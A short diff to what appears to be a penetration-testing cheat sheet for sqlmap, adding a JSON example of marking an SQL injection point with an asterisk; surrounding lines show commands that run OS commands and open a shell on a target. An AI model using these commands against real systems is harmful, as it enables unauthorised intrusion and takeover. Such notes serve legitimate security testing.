@@ -1334,6 +1334,9 @@ python /path/to/sqlmap -r req.txt -p param_to_attack --os-cmd=command_here
 
 # upload shell to target + get command prompt
 python /path/to/sqlmap -r req.txt -p param_to_attack --os-shell
+
+# designate injection point in request file : *
+{"template":"{\"name\":\"123*\"}"}
 ```
 
 
